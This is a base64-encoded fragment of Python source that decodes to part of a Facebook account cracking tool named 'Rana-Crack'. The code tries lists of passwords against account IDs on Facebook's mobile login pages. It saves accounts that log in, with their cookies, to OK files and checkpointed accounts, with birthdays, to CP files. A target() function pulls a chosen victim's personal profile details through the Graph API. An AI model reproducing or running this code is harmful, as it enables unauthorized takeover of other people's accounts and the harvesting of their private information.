AgICAgICAgICAgICAgICAgdHRsID0gdHRbImJpcnRoZGF5Il0NCiAgICAgICAgICAgICAgICAgICAgICAgIG0sZCx5ID0gdHRsLnNwbGl0KCIvIikNCiAgICAgICAgICAgICAgICAgICAgICAgIG0gPSBidWxhbl90dGxbbV0NCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcciVzWyVzUkFOQS1DUCVzXSAlcyDigKIgJXMg4oCiICVzICVzICVzJXMiJShPLFAsTyxmbC5nZXQoImlkIiksaSxkLG0seSx0YWh1bihmbC5nZXQoImlkIikpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuY3AuYXBwZW5kKCIlc+KAoiVz4oCiJXMlcyVzIiUoZmwuZ2V0KCJpZCIpLGksZCxtLHkpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3BlbigiQ1AvJXMudHh0IiUodGFuZ2dhbCksImErIikud3JpdGUoIiVz4oCiJXPigKIlcyVzJXNcbiIlKGZsLmdldCgiaWQiKSxpLGQsbSx5KSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdChLZXlFcnJvciwgSU9FcnJvcik6DQogICAgICAgICAgICAgICAgICAgICAgICBtID0gIiAiDQogICAgICAgICAgICAgICAgICAgICAgICBkID0gIiAiDQogICAgICAgICAgICAgICAgICAgICAgICB5ID0gIiAiDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgICAgICAgICAgICAgIHByaW50KCJcciVzWyVzUkFOQS1DUCVzXSAlcyDigKIgJXMlcyAgICAgIiUoTyxQLE8sZmwuZ2V0KCJpZCIpLGksdGFodW4oZmwuZ2V0KCJpZCIpKSkpDQogICAgICAgICAgICAgICAgICAgIHNlbGYuY3AuYXBwZW5kKCIlc+KAoiVzIiUoZmwuZ2V0KCJpZCIpLGkpKQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCJDUC8lcy50eHQiJSh0YW5nZ2FsKSwiYSsiKS53cml0ZSgiJXPigKIlc1xuIiUoZmwuZ2V0KCJpZCIpLGkpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgbG9nLmdldCgic3RhdHVzIik9PSJzdWNjZXNzIjoNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxyJXNbJXNSQU5BLU9LJXNdICVzIOKAoiAlcyVzICAgICAiJShILFAsSCxmbC5nZXQoImlkIiksaSx0YWh1bihmbC5nZXQoImlkIikpKSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiIpDQogICAgICAgICAgICAgICAgICAgIHNlbGYuYWRhLmFwcGVuZCgiJXPigKIlcyIlKGZsLmdldCgiaWQiKSxpKSkNCiAgICAgICAgICAgICAgICAgICAgb3BlbigiT0svJXMudHh0IiUodGFuZ2dhbCksImErIikud3JpdGUoIiVz4oCiJXNcbiIlKGZsLmdldCgiaWQiKSxpKSkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBlbHNlOmNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgc2VsZi5rbys9MQ0KICAgICAgICAgICAgcHJpbnQoIlxyJXNbJXNDcmFjayVzXVslcyVzLyVzJXNdWyVzT0s6JXMlc11bJXNDUDolcyVzXSVzIiUoTyxQLE8sUCxzZWxmLmtvLGxlbihzZWxmLmZsKSxPLFAsbGVuKHNlbGYuYWRhKSxPLFAsbGVuKHNlbGYuY3ApLE8sUCksIGVuZD0nICcpO3N5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBzZWxmLmFwaV9vcHNpKGZsKQ0KICAgIGRlZiBtYmFzaWMoc2VsZixmbCk6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGZvciBpIGluIGZsLmdldCgicHciKToNCiAgICAgICAgICAgICAgICBsb2cgPSBsb2dfbWJhc2ljKGZsLmdldCgiaWQiKSwNCiAgICAgICAgICAgICAgICAgICAgaSwiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tIikNCiAgICAgICAgICAgICAgICBpZiBsb2cuZ2V0KCJzdGF0dXMiKT09ImNwIjoNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAga2UgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBmbC5nZXQoImlkIikgKyAiP2FjY2Vzc190b2tlbj0iICsgb3BlbigidG9rZW4udHh0IiwiciIpLnJlYWQoKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHR0ID0ganNvbi5sb2FkcyhrZS50ZXh0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgdHRsID0gdHRbImJpcnRoZGF5Il0NCiAgICAgICAgICAgICAgICAgICAgICAgIG0sZCx5ID0gdHRsLnNwbGl0KCIvIikNCiAgICAgICAgICAgICAgICAgICAgICAgIG0gPSBidWxhbl90dGxbbV0NCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcciVzWyVzUkFOQS1DUCVzXSAlcyDigKIgJXMg4oCiICVzICVzICVzJXMiJShPLFAsTyxmbC5nZXQoImlkIiksaSxkLG0seSx0YWh1bihmbC5nZXQoImlkIikpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuY3AuYXBwZW5kKCIlc+KAoiVz4oCiJXMlcyVzIiUoZmwuZ2V0KCJpZCIpLGksZCxtLHkpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3BlbigiQ1AvJXMudHh0IiUodGFuZ2dhbCksImErIikud3JpdGUoIiVz4oCiJXPigKIlcyVzJXNcbiIlKGZsLmdldCgiaWQiKSxpLGQsbSx5KSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdChLZXlFcnJvciwgSU9FcnJvcik6DQogICAgICAgICAgICAgICAgICAgICAgICBtID0gIiAiDQogICAgICAgICAgICAgICAgICAgICAgICBkID0gIiAiDQogICAgICAgICAgICAgICAgICAgICAgICB5ID0gIiAiDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgICAgICAgICAgICAgIHByaW50KCJcciVzWyVzUkFOQS1DUCVzXSAlcyDigKIgJXMlcyAgICAgIiUoTyxQLE8sZmwuZ2V0KCJpZCIpLGksdGFodW4oZmwuZ2V0KCJpZCIpKSkpDQogICAgICAgICAgICAgICAgICAgIHNlbGYuY3AuYXBwZW5kKCIlc+KAoiVzIiUoZmwuZ2V0KCJpZCIpLGkpKQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCJDUC8lcy50eHQiJSh0YW5nZ2FsKSwiYSsiKS53cml0ZSgiJXPigKIlc1xuIiUoZmwuZ2V0KCJpZCIpLGkpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgbG9nLmdldCgic3RhdHVzIik9PSJzdWNjZXNzIjoNCiAgICAgICAgICAgICAgICAgICAgaF9vayA9ICJcciVzWyVzYVJBTkEtT0slc10gJXMg4oCiICVzJXMlcyAgICAgIiUoSCxQLEgsZmwuZ2V0KCJpZCIpLGksdGFodW4oZmwuZ2V0KCJpZCIpKSxQKQ0KICAgICAgICAgICAgICAgICAgICBjZWtfYXBrKGhfb2ssa29raShsb2cuZ2V0KCJjb29raWVzIikpKQ0KICAgICAgICAgICAgICAgICAgICBzZWxmLmFkYS5hcHBlbmQoIiVz4oCiJXMiJShmbC5nZXQoImlkIiksaSkpDQogICAgICAgICAgICAgICAgICAgIG9wZW4oIk9LLyVzLnR4dCIlKHRhbmdnYWwpLCJhKyIpLndyaXRlKCIlc+KAoiVzXG4iJShmbC5nZXQoImlkIiksaSkpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgZWxzZTpjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIHNlbGYua28rPTENCiAgICAgICAgICAgIHByaW50KCJcciVzWyVzUmFuYS1DcmFjayVzXVslcyVzLyVzJXNdWyVzT0s6JXMlc11bJXNDUDolcyVzXSVzIiUoTyxQLE8sUCxzZWxmLmtvLGxlbihzZWxmLmZsKSxPLFAsbGVuKHNlbGYuYWRhKSxPLFAsbGVuKHNlbGYuY3ApLE8sUCksIGVuZD0nICcpO3N5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBzZWxmLm1iYXNpYyhmbCkNCiAgICBkZWYgbWJhc2ljX29wc2koc2VsZixmbCk6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGZvciBpIGluIGZsLmdldCgicHciKToNCiAgICAgICAgICAgICAgICBsb2cgPSBsb2dfbWJhc2ljKGZsLmdldCgiaWQiKSwNCiAgICAgICAgICAgICAgICAgICAgaSwiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tIikNCiAgICAgICAgICAgICAgICBpZiBsb2cuZ2V0KCJzdGF0dXMiKT09ImNwIjoNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAga2UgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBmbC5nZXQoImlkIikgKyAiP2FjY2Vzc190b2tlbj0iICsgb3BlbigidG9rZW4udHh0IiwiciIpLnJlYWQoKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHR0ID0ganNvbi5sb2FkcyhrZS50ZXh0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgdHRsID0gdHRbImJpcnRoZGF5Il0NCiAgICAgICAgICAgICAgICAgICAgICAgIG0sZCx5ID0gdHRsLnNwbGl0KCIvIikNCiAgICAgICAgICAgICAgICAgICAgICAgIG0gPSBidWxhbl90dGxbbV0NCiAgICAgICAgICAgICAgICAgICAgICAgIGhfY3AgPSAiXHIlc1slc1JBTkEtQ1Alc10gJXMg4oCiICVzIOKAoiAlcyAlcyAlcyVzIiUoTyxQLE8sZmwuZ2V0KCJpZCIpLGksZCxtLHksdGFodW4oZmwuZ2V0KCJpZCIpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGNla19sb2coZmwuZ2V0KCJpZCIpLGksaF9jcCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5jcC5hcHBlbmQoIiVz4oCiJXPigKIlcyVzJXMiJShmbC5nZXQoImlkIiksaSxkLG0seSkpDQogICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCJDUC8lcy50eHQiJSh0YW5nZ2FsKSwiYSsiKS53cml0ZSgiJXPigKIlc+KAoiVzJXMlc1xuIiUoZmwuZ2V0KCJpZCIpLGksZCxtLHkpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0KEtleUVycm9yLCBJT0Vycm9yKToNCiAgICAgICAgICAgICAgICAgICAgICAgIG0gPSAiICINCiAgICAgICAgICAgICAgICAgICAgICAgIGQgPSAiICINCiAgICAgICAgICAgICAgICAgICAgICAgIHkgPSAiICINCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgICAgICAgICAgICAgaF9jcCA9ICJcciVzWyVzUkFOQS1DUCVzXSAlcyDigKIgJXMlcyAgICAgIiUoTyxQLE8sZmwuZ2V0KCJpZCIpLGksdGFodW4oZmwuZ2V0KCJpZCIpKSkNCiAgICAgICAgICAgICAgICAgICAgY2VrX2xvZyhmbC5nZXQoImlkIiksaSxoX2NwKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCgiIikNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5jcC5hcHBlbmQoIiVz4oCiJXMiJShmbC5nZXQoImlkIiksaSkpDQogICAgICAgICAgICAgICAgICAgIG9wZW4oIkNQLyVzLnR4dCIlKHRhbmdnYWwpLCJhKyIpLndyaXRlKCIlc+KAoiVzXG4iJShmbC5nZXQoImlkIiksaSkpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgZWxpZiBsb2cuZ2V0KCJzdGF0dXMiKT09InN1Y2Nlc3MiOg0KICAgICAgICAgICAgICAgICAgICBoX29rID0gIlxyJXNbJXNSQU5BLU9LJXNdICVzIOKAoiAlcyVzJXMgICAgICIlKEgsUCxILGZsLmdldCgiaWQiKSxpLHRhaHVuKGZsLmdldCgiaWQiKSksUCkNCiAgICAgICAgICAgICAgICAgICAgY2VrX2FwayhoX29rLGtva2kobG9nLmdldCgiY29va2llcyIpKSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiIpDQogICAgICAgICAgICAgICAgICAgIHNlbGYuYWRhLmFwcGVuZCgiJXPigKIlcyIlKGZsLmdldCgiaWQiKSxpKSkNCiAgICAgICAgICAgICAgICAgICAgb3BlbigiT0svJXMudHh0IiUodGFuZ2dhbCksImErIikud3JpdGUoIiVz4oCiJXNcbiIlKGZsLmdldCgiaWQiKSxpKSkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBlbHNlOmNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgc2VsZi5rbys9MQ0KICAgICAgICAgICAgcHJpbnQoIlxyJXNbJXNSYW5hLUNyYWNrJXNdWyVzJXMvJXMlc11bJXNPSzolcyVzXVslc0NQOiVzJXNdJXMiJShPLFAsTyxQLHNlbGYua28sbGVuKHNlbGYuZmwpLE8sUCxsZW4oc2VsZi5hZGEpLE8sUCxsZW4oc2VsZi5jcCksTyxQKSwgZW5kPScgJyk7c3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgIHNlbGYubWJhc2ljX29wc2koZmwpDQogICAgZGVmIGZyZWUoc2VsZixmbCk6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGZvciBpIGluIGZsLmdldCgicHciKToNCiAgICAgICAgICAgICAgICBsb2cgPSBsb2dfZnJlZShmbC5nZXQoImlkIiksDQogICAgICAgICAgICAgICAgICAgIGksImh0dHBzOi8vZnJlZS5mYWNlYm9vay5jb20iKQ0KICAgICAgICAgICAgICAgIGlmIGxvZy5nZXQoInN0YXR1cyIpPT0iY3AiOg0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICBrZSA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIiArIGZsLmdldCgiaWQiKSArICI/YWNjZXNzX3Rva2VuPSIgKyBvcGVuKCJ0b2tlbi50eHQiLCJyIikucmVhZCgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdHQgPSBqc29uLmxvYWRzKGtlLnRleHQpDQogICAgICAgICAgICAgICAgICAgICAgICB0dGwgPSB0dFsiYmlydGhkYXkiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgbSxkLHkgPSB0dGwuc3BsaXQoIi8iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgbSA9IGJ1bGFuX3R0bFttXQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxyJXNbJXNSQU5BLUNQJXNdICVzIOKAoiAlcyDigKIgJXMgJXMgJXMlcyIlKE8sUCxPLGZsLmdldCgiaWQiKSxpLGQsbSx5LHRhaHVuKGZsLmdldCgiaWQiKSkpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5jcC5hcHBlbmQoIiVz4oCiJXPigKIlcyVzJXMiJShmbC5nZXQoImlkIiksaSxkLG0seSkpDQogICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCJDUC8lcy50eHQiJSh0YW5nZ2FsKSwiYSsiKS53cml0ZSgiJXPigKIlc+KAoiVzJXMlc1xuIiUoZmwuZ2V0KCJpZCIpLGksZCxtLHkpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0KEtleUVycm9yLCBJT0Vycm9yKToNCiAgICAgICAgICAgICAgICAgICAgICAgIG0gPSAiICINCiAgICAgICAgICAgICAgICAgICAgICAgIGQgPSAiICINCiAgICAgICAgICAgICAgICAgICAgICAgIHkgPSAiICINCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxyJXNbJXNSQU5BLUNQJXNdICVzIOKAoiAlcyVzICAgICAiJShPLFAsTyxmbC5nZXQoImlkIiksaSx0YWh1bihmbC5nZXQoImlkIikpKSkNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5jcC5hcHBlbmQoIiVz4oCiJXMiJShmbC5nZXQoImlkIiksaSkpDQogICAgICAgICAgICAgICAgICAgIG9wZW4oIkNQLyVzLnR4dCIlKHRhbmdnYWwpLCJhKyIpLndyaXRlKCIlc+KAoiVzXG4iJShmbC5nZXQoImlkIiksaSkpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgZWxpZiBsb2cuZ2V0KCJzdGF0dXMiKT09InN1Y2Nlc3MiOg0KICAgICAgICAgICAgICAgICAgICBoX29rID0gIlxyJXNbJXNSQU5BLU9LJXNdICVzIOKAoiAlcyVzJXMgICAgICIlKEgsUCxILGZsLmdldCgiaWQiKSxpLHRhaHVuKGZsLmdldCgiaWQiKSksUCkNCiAgICAgICAgICAgICAgICAgICAgY2VrX2FwayhoX29rLGtva2kobG9nLmdldCgiY29va2llcyIpKSkNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGEuYXBwZW5kKCIlc+KAoiVzIiUoZmwuZ2V0KCJpZCIpLGkpKQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCJPSy8lcy50eHQiJSh0YW5nZ2FsKSwiYSsiKS53cml0ZSgiJXPigKIlc1xuIiUoZmwuZ2V0KCJpZCIpLGkpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsc2U6Y29udGludWUNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICBzZWxmLmtvKz0xDQogICAgICAgICAgICBwcmludCgiXHIlc1slc1JhbmEtQ3JhY2slc11bJXMlcy8lcyVzXVslc09LOiVzJXNdWyVzQ1A6JXMlc10lcyIlKE8sUCxPLFAsc2VsZi5rbyxsZW4oc2VsZi5mbCksTyxQLGxlbihzZWxmLmFkYSksTyxQLGxlbihzZWxmLmNwKSxPLFApLCBlbmQ9JyAnKTtzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgc2VsZi5mcmVlKGZsKQ0KICAgIGRlZiBmcmVlX29wc2koc2VsZixmbCk6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGZvciBpIGluIGZsLmdldCgicHciKToNCiAgICAgICAgICAgICAgICBsb2cgPSBsb2dfZnJlZShmbC5nZXQoImlkIiksDQogICAgICAgICAgICAgICAgICAgIGksImh0dHBzOi8vZnJlZS5mYWNlYm9vay5jb20iKQ0KICAgICAgICAgICAgICAgIGlmIGxvZy5nZXQoInN0YXR1cyIpPT0iY3AiOg0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICBrZSA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIiArIGZsLmdldCgiaWQiKSArICI/YWNjZXNzX3Rva2VuPSIgKyBvcGVuKCJ0b2tlbi50eHQiLCJyIikucmVhZCgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdHQgPSBqc29uLmxvYWRzKGtlLnRleHQpDQogICAgICAgICAgICAgICAgICAgICAgICB0dGwgPSB0dFsiYmlydGhkYXkiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgbSxkLHkgPSB0dGwuc3BsaXQoIi8iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgbSA9IGJ1bGFuX3R0bFttXQ0KICAgICAgICAgICAgICAgICAgICAgICAgaF9jcCA9ICJcciVzWyVzUkFOQS1DUCVzXSAlcyDigKIgJXMg4oCiICVzICVzICVzJXMiJShPLFAsTyxmbC5nZXQoImlkIiksaSxkLG0seSx0YWh1bihmbC5nZXQoImlkIikpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgY2VrX2xvZyhmbC5nZXQoImlkIiksaSxoX2NwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiIpDQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmNwLmFwcGVuZCgiJXPigKIlc+KAoiVzJXMlcyIlKGZsLmdldCgiaWQiKSxpLGQsbSx5KSkNCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oIkNQLyVzLnR4dCIlKHRhbmdnYWwpLCJhKyIpLndyaXRlKCIlc+KAoiVz4oCiJXMlcyVzXG4iJShmbC5nZXQoImlkIiksaSxkLG0seSkpDQogICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICBleGNlcHQoS2V5RXJyb3IsIElPRXJyb3IpOg0KICAgICAgICAgICAgICAgICAgICAgICAgbSA9ICIgIg0KICAgICAgICAgICAgICAgICAgICAgICAgZCA9ICIgIg0KICAgICAgICAgICAgICAgICAgICAgICAgeSA9ICIgIg0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICAgICAgICAgICAgICBoX2NwID0gIlxyJXNbJXNSQU5BLUNQJXNdICVzIOKAoiAlcyVzICAgICAiJShPLFAsTyxmbC5nZXQoImlkIiksaSx0YWh1bihmbC5nZXQoImlkIikpKQ0KICAgICAgICAgICAgICAgICAgICBjZWtfbG9nKGZsLmdldCgiaWQiKSxpLGhfY3ApDQogICAgICAgICAgICAgICAgICAgIHByaW50KCIiKQ0KICAgICAgICAgICAgICAgICAgICBzZWxmLmNwLmFwcGVuZCgiJXPigKIlcyIlKGZsLmdldCgiaWQiKSxpKSkNCiAgICAgICAgICAgICAgICAgICAgb3BlbigiQ1AvJXMudHh0IiUodGFuZ2dhbCksImErIikud3JpdGUoIiVz4oCiJXNcbiIlKGZsLmdldCgiaWQiKSxpKSkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBlbGlmIGxvZy5nZXQoInN0YXR1cyIpPT0ic3VjY2VzcyI6DQogICAgICAgICAgICAgICAgICAgIGhfb2sgPSAiXHIlc1slc1JBTkEtT0slc10gJXMg4oCiICVzJXMlcyAgICAgIiUoSCxQLEgsZmwuZ2V0KCJpZCIpLGksdGFodW4oZmwuZ2V0KCJpZCIpKSxQKQ0KICAgICAgICAgICAgICAgICAgICBjZWtfYXBrKGhfb2ssa29raShsb2cuZ2V0KCJjb29raWVzIikpKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCgiIikNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5hZGEuYXBwZW5kKCIlc+KAoiVzIiUoZmwuZ2V0KCJpZCIpLGkpKQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCJPSy8lcy50eHQiJSh0YW5nZ2FsKSwiYSsiKS53cml0ZSgiJXPigKIlc1xuIiUoZmwuZ2V0KCJpZCIpLGkpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsc2U6Y29udGludWUNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICBzZWxmLmtvKz0xDQogICAgICAgICAgICBwcmludCgiXHIlc1slc1JhbmEtQ3JhY2slc11bJXMlcy8lcyVzXVslc09LOiVzJXNdWyVzQ1A6JXMlc10lcyIlKE8sUCxPLFAsc2VsZi5rbyxsZW4oc2VsZi5mbCksTyxQLGxlbihzZWxmLmFkYSksTyxQLGxlbihzZWxmLmNwKSxPLFApLCBlbmQ9JyAnKTtzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgc2VsZi5mcmVlX29wc2koZmwpDQpkZWYgdGFyZ2V0KCk6DQogICAgdHJ5OnRva2VuID0gb3BlbigndG9rZW4udHh0JywncicpLnJlYWQoKQ0KICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6amFsYW4oJyVz4p2l4pSBWyVzISVzXSAlc1Rva2VuL0Nvb2tpZXMgSW52YWxpZCclKE0sUCxNLFApKTttZW51X2xvZygpDQogICAgaWR0ID0gaW5wdXQoIiVz4p2l4pSBWyVz4oCiJXNdICVzSUQgVGFyZ2V0IDogIiUoTyxQLE8sUCkpDQogICAgdHJ5Og0KICAgICAgICB6eCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIj9hY2Nlc3NfdG9rZW49Iit0b2tlbik7enkgPSBqc29uLmxvYWRzKHp4LnRleHQpDQogICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKTpqYWxhbignJXPinaXilIFbJXMhJXNdICVzSUQgVGlkYWsgRGl0ZW11a2FuJyUoTSxQLE0sUCkpO21lbnUoKQ0KICAgIHRyeTpubSA9IHp5WyJuYW1lIl0NCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOm5tID0gKCItIikNCiAgICB0cnk6bmQgPSB6eVsiZmlyc3RfbmFtZSJdDQogICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKTpuZCA9ICgiLSIpDQogICAgdHJ5Om50ID0genlbIm1pZGRsZV9uYW1lIl0NCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOm50ID0gKCItIikNCiAgICB0cnk6bmIgPSB6eVsibGFzdF9uYW1lIl0NCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOm5iID0gKCItIikNCiAgICB0cnk6dXQgPSB6eVsiYmlydGhkYXkiXQ0KICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6dXQgPSAoIi0iKQ0KICAgIHRyeTpnZCA9IHp5WyJnZW5kZXIiXQ0KICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6Z2QgPSAoIi0iKQ0KICAgIHRyeTplbSA9IHp5WyJlbWFpbCJdDQogICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKTplbSA9ICgiLSIpDQogICAgdHJ5OmxrID0genlbImxpbmsiXQ0KICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6bGsgPSAoIi0iKQ0KICAgIHRyeTp1cyA9IHp5WyJ1c2VybmFtZSJdDQogICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKTp1cyA9ICgiLSIpDQogICAgdHJ5OnJnID0genlbInJlbGlnaW9uIl0NCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOnJnID0gKCItIikNCiAgICB0cnk6cmwgPSB6eVsicmVsYXRpb25zaGlwX3N0YXR1cyJdDQogICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKTpybCA9ICgiLSIpDQogICAgdHJ5OnJscyA9IHp5WyJzaWduaWZpY2FudF9vdGhlciJdWyJuYW1lIl0NCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOnJscyA9ICgiLSIpDQogICAgdHJ5OmxjID0genlbImxvY2F0aW9uIl1bIm5hbWUiXQ0KICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6bGMgPSAoIi0iKQ0KICAgIHRyeTpodCA9IHp5WyJob21ldG93biJdWyJuYW1lIl0NCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOmh0ID0gKCItIikNCiAgICB0cnk6YWIgPSB6eVsiYWJvdXQiXQ0KICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6YWIgPSAoIi0iKQ0KICAgIHRyeTpsbyA9IHp5WyJsb2NhbGUiXQ0KICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6bG8gPSAoIi0iKQ0KICAgIGphbGFuKCclc+KVoOKVkOKVkFslc+KAoiVzXSAlc05hbWEgOiAlcyclKE8sUCxPLFAsbm0pKQ0KICAgIGphbGFuKCclc+KVoOKVkOKVkFslc+KAoiVzXSAlc05hbWEgRGVwYW4gOiAlcyclKE8sUCxPLFAsbmQpKQ0KICAgIGphbGFuKCclc+KVoOKVkOKVkFslc+KAoiVzXSAlc05hbWEgVGVuZ2FoIDogJXMnJShPLFAsTyxQLG50KSkNCiAgICBqYWxhbignJXPilaDilZDilZBbJXPigKIlc10gJXNOYW1hIEJlbGFrYW5nIDogJXMnJShPLFAsTyxQLG5iKSkNCiAgICBqYWxhbignJXPilaDilZDilZBbJXPigKIlc10gJXNUVEwgOiAlcyclKE8sUCxPLFAsdXQpKQ0KICAgIGphbGFuKCclc+KVoOKVkOKVkFslc+KAoiVzXSAlc0dlbmRlciA6ICVzJyUoTyxQLE8sUCxnZCkpDQogICAgamFsYW4oJyVz4pWg4pWQ4pWQWyVz4oCiJXNdICVzRW1haWwgOiAlcyclKE8sUCxPLFAsZW0pKQ0KICAgIGphbGFuKCclc+KVoOKVkOKVkFslc+KAoiVzXSAlc0xpbmsgOiAlcyclKE8sUCxPLFAsbGspKQ0KICAgIGphbGFuKCclc+KVoOKVkOKVkFslc+KAoiVzXSAlc1VzZXJuYW1lIDogJXMnJShPLFAsTyxQLHVzKSkNCiAgICBqYWx